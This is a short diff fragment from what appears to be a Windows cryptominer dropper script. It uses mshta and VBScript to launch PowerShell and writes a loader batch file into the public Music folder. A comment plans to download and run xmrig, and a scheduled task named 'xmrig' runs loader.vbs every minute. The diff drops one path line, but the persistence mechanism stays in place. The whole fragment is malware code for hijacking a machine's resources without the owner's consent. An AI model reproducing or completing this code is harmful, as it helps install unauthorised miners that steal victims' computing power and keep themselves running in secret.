@@ -79,7 +79,7 @@ mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -Execu"
 [IO.filE]::WriteAllText( 'C:\Users\Public\Music\loader.bat',$lbat )
 # now we have to download xmrig or see a way if wecan copy its binaries and execute it 
 #add the scheduled task (vbs )
-"C:\Users\Public\Music\v.vbs"
+
 schtasks.exe /create  /tn "xmrig" /sc minute /mo 1 /tr "C:\Users\Public\Music\loader.vbs"  
 
 
